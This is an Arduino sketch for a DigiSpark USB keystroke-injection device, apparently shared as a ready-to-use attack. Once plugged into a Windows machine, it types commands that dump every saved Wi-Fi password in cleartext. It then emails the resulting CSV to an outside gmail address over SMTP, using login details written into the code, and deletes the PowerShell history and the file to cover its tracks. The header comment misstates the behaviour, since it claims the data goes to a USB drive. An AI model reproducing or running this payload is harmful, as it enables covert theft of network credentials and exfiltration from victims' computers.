//This DigiSpark script writes the wireless network credentials to a csv file in a usb mounted at d:\ - change accordingly.
//Credits to p0wc0w.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd c:\\");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("mkdir temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %"));
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("$name=$_.Matches.Groups"));
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("1"));
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_ALT_RIGHT);
  DigiKeyboard.print(F(".Value.Trim(); $_"));
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_ALT_RIGHT);
  DigiKeyboard.print(F(" | %"));
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("(netsh wlan show profile name=$name key=clear)"));
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("| Select-String 'Key Content\\W+\\:(.+)$' | %"));
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("$pass=$_.Matches.Groups"));
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("1"));
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_ALT_RIGHT);
  DigiKeyboard.print(F(".Value.Trim(); $_"));
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_ALT_RIGHT);
  DigiKeyboard.print(F(" | %"));
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("PSCustomObject"));
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("  PROFILE_NAME=$name;PASSWORD=$pass "));
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_ALT_RIGHT);
  DigiKeyboard.print(F(" | Export-Csv temp.csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("$credentials = Get-Credential"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("john.smith"));
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("sapo.pt"));
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.print(F("zyfcuk-zohzu3-cukpIz"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("Send-MailMessage -From 'john.smith"));
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("sapo.pt' -to 'dk.fsgm"));
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("gmail.com' -Subject 'Digispark Report' -Body 'Attached is your report.' -SmtpServer 'smtp.sapo.pt' -port 587 -UseSsl -Credential $credentials -Attachments 'temp.csv'"));  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("del temp.csv"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
